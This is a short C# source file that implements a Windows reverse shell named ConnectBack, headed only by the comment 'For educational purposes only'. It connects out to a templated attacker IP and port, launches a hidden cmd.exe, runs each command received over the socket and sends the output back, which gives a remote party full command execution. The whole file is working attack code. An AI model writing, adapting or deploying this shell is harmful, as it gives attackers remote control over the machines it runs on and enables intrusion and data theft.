//  For educational purposes only
using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.Linq;
using System.Net;
using System.Net.Sockets;

namespace ConnectBack
{
	public class Program
	{
		static StreamWriter streamWriter;

		public static void Main(string[] args)
		{
			try
			{
				using (TcpClient client = new TcpClient("_IP_", _PORT_))
				{
					using (Stream stream = client.GetStream())
					{
						using (StreamReader rdr = new StreamReader(stream))
						{
							streamWriter = new StreamWriter(stream) { AutoFlush = true };

							StringBuilder strInput = new StringBuilder();

							Process p = new Process();
							p.StartInfo.FileName = "cmd.exe"; // Changed to cmd.exe for Windows
							p.StartInfo.CreateNoWindow = true;
							p.StartInfo.UseShellExecute = false;
							p.StartInfo.RedirectStandardOutput = true;
							p.StartInfo.RedirectStandardInput = true;
							p.StartInfo.RedirectStandardError = true;
							p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
							p.Start();
							p.BeginOutputReadLine();

							while (true)
							{
								strInput.Append(rdr.ReadLine());
								p.StandardInput.WriteLine(strInput.ToString());
								strInput.Clear();
							}
						}
					}
				}
			}
			catch (Exception ex)
			{
				Console.Error.WriteLine("An error occurred: " + ex.Message);
			}
		}

		private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
		{
			if (!string.IsNullOrEmpty(outLine.Data))
			{
				try
				{
					streamWriter.WriteLine(outLine.Data);
				}
				catch (Exception ex)
				{
					Console.Error.WriteLine("Error writing to stream: " + ex.Message);
				}
			}
		}
	}
}
